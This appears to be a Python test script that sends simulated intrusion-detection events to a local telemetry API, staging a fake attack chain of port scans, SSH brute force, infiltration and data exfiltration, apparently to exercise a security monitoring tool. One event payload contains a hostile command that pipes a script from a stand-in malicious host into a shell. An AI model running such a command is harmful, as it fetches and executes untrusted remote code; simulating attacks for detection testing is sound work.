import requests
import time
import random

API_URL = "http://localhost:8005/api/telemetry/events"

def send_event(event_type, severity, message, payload=None):
    event = {
        "sensor_name": "GATEWAY-01",
        "sensor_type": "IDS/NDR",
        "event_type": event_type,
        "severity": severity,
        "message": message,
        "payload": payload or {}
    }
    try:
        resp = requests.post(API_URL, json=event, timeout=5)
        print(f"[+] [{event_type}] {message} -> Status: {resp.status_code}")
    except Exception as e:
        print(f"[-] Error sending {event_type}: {e}")

def run_attack_chain():
    print("=== STARTING MULTI-STAGE ATTACK CHAIN SIMULATION ===")
    
    # STAGE 1: RECONNAISSANCE
    print("\n[STAGE 1] Reconnaissance & Scanning...")
    for i in range(5):
        port = random.choice([21, 22, 80, 443, 3306, 5432, 8080])
        send_event(
            "Network Service Scanning", 
            "Low", 
            f"Scanning port {port}", 
            {"src_ip": "192.168.1.50", "dst_port": port, "country": "RU", "mitre_id": "T1595"}
        )
        time.sleep(1)

    # STAGE 2: BRUTE FORCE
    print("\n[STAGE 2] Credential Access (Brute Force)...")
    for i in range(10):
        send_event(
            "SSH-Patator", 
            "High", 
            "SSH Login attempt failed", 
            {"src_ip": "192.168.1.50", "user": "admin", "mitre_id": "T1110"}
        )
        time.sleep(0.5)

    # STAGE 3: EXPLOITATION & LATERAL MOVEMENT
    print("\n[STAGE 3] Exploitation (Infiltration)...")
    send_event(
        "Infiltration", 
        "Critical", 
        "Suspicious shell command execution detected", 
        {"src_ip": "192.168.1.50", "cmd": "whoami; curl http://malicious.com/shell.sh | sh", "mitre_id": "T1203"}
    )
    time.sleep(2)

    # STAGE 4: ACTIONS ON OBJECTIVES (DATA EXFILTRATION)
    print("\n[STAGE 4] Exfiltration over Web Service...")
    send_event(
        "Exfiltration Over Web Service", 
        "Critical", 
        "Large data transfer to unknown external IP", 
        {"src_ip": "192.168.1.10", "dst_ip": "45.10.11.22", "bytes": 5000000, "mitre_id": "T1567"}
    )
    
    print("\n=== ATTACK CHAIN COMPLETE ===")

if __name__ == "__main__":
    run_attack_chain()
